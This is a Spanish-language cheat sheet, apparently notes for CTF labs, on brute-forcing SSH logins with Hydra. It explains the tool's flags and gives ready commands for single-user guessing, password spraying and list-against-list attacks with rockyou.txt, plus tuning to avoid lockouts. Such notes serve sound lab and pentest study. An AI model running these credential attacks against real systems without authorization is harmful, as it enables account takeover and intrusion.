# Fuerza Bruta Online (Servicios de Red / SSH)

**Objetivo:** Obtener acceso a un servicio activo (como SSH en el puerto 22) probando credenciales directamente contra el servidor.
**Herramienta Reina en CTFs:** `Hydra`

---

## La Regla de Oro de Hydra (Mayúsculas vs Minúsculas)
El éxito con Hydra depende de no confundir estas banderas:
* `-l` (minúscula) = **L**ogin específico (Ej: `-l root`)
* `-L` (mayúscula) = **L**ista de Logins (Ej: `-L usuarios.txt`)
* `-p` (minúscula) = **P**assword específico (Ej: `-p admin123`)
* `-P` (mayúscula) = **P**assword Lista (Ej: `-P /usr/share/wordlists/rockyou.txt`)

---

## Escenarios de Ataque (Ejemplos con SSH - Puerto 22)

### Escenario 1: Tengo el USUARIO, me falta la CONTRASEÑA
*Es el caso más común. Encontraste un nombre (ej. "admin" o el nombre del creador de la máquina) y quieres adivinar su clave.*
* **Comando:**
  `hydra -l [usuario] -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.X -t 4`
* **Ejemplo práctico:**
  `hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.20 -t 4`

### Escenario 2: Tengo la CONTRASEÑA, me falta el USUARIO (Password Spraying)
*Encontraste una contraseña en el código fuente de la web (ej. "P@ssw0rd2026!"), pero no sabes a qué usuario pertenece. Creas un archivo `users.txt` con posibles nombres y atacas.*
* **Comando:**
  `hydra -L users.txt -p "[contraseña]" ssh://10.10.10.X -t 4`
* **Ejemplo práctico:**
  `hydra -L users.txt -p "SuperSecret123" ssh://10.10.10.20 -t 4`

### Escenario 3: No tengo NADA (Lista contra Lista)
*Solo se recomienda si los diccionarios son muy pequeños (ej. 10 usuarios y 50 contraseñas). Si usas Rockyou aquí, puede tardar semanas.*
* **Comando:**
  `hydra -L users.txt -P passwords.txt ssh://10.10.10.X -t 4`

---

## Optimización y Prevención de Errores

Si atacas muy rápido, el servicio SSH de la máquina víctima se asustará, rechazará las conexiones y Hydra fallará arrojando errores.

* **`-t 4` (Tareas Paralelas):** Controla la velocidad. Para SSH, **nunca uses más de 4 hilos**. Si usas más, SSH bloqueará las conexiones y perderás contraseñas válidas.
* **`-V` (Verbose):** Te muestra en pantalla cada intento en tiempo real (útil para saber que la herramienta no se ha quedado pegada).
* **`-f` (Exit on First):** ¡Muy recomendado! Le dice a Hydra: "En cuanto encuentres una contraseña válida, detente". Evita que siga escaneando innecesariamente.

**El Comando Perfecto y Definitivo:**
`hydra -l admin -P rockyou.txt ssh://10.10.10.X -t 4 -V -f`